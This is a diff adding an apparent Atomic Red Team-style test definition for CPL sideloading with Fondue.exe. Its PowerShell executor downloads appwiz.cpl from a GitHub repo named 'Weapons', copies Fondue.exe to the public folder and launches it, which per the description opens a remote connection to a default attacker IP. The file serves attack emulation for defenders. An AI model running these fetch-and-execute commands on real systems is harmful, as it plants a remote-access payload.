@@ -1,0 +1,39 @@
+attack_technique: TFondue
+display_name: 'CPL sideloading Fondue.exe'
+atomic_tests:
+- name: CPL sideloading Fondue.exe
+  auto_generated_guid: f92a474f-ced9-491f-b338-95a991418ce2
+  description: |
+    Copy fondue.exe from system32 to public folder and remotely download appwiz.cpl.
+    When fondue.exe is sucessfully executed, appwiz.cpl code will be executed and a remote connection will be established to the attacker system.
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: location to save file 
+      type: string
+      default: $env:public\appwiz.cpl
+    file_url:
+      description: URL to download the file
+      type: string
+      default: https://github.com/HakkYahud/Weapons/raw/main/appwiz.cpl
+    fondue_path:
+      description: Fondue.exe location
+      type: string
+      default: $env:windir\System32\Fondue.exe
+    destination:
+      description: Copy file destination
+      type: string
+      default: $env:public\Fondue.exe
+    attacker_system:
+      description: Attacker system IP address
+      type: string
+      default: 192.168.2.110
+  executor:
+    command: |
+      (New-Object System.Net.WebClient).DownloadFile("#{file_url}", "#{file_path}")
+      Copy-Item -Path "#{fondue_path}" -Destination "#{destination}"
+      Start-Process -FilePath "#{destination}"
+    cleanup_command:
+      Remove-item "#{file_path}", "#{destination}" -ErrorAction Ignore
+    name: powershell
